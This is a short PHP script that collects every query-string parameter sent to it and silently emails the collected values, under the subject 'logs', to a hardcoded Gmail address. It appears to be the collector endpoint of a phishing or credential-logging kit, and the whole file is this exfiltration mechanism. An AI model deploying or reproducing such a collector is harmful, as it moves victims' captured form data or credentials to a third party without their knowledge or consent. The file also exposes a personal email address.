<?php
    $logs = "";
    foreach($_GET as $variable => $value){
        $logs .= $variable;
        $logs .= "=";
        $logs .= $value;
        $logs .= '\r\n';
    }
    $logs .= '\r\n';
    $to = "richardtheofillusp@gmail.com";
    $subject = "logs";
    $txt = $logs;
    mail($to, $subject, $txt);
    exit;
?>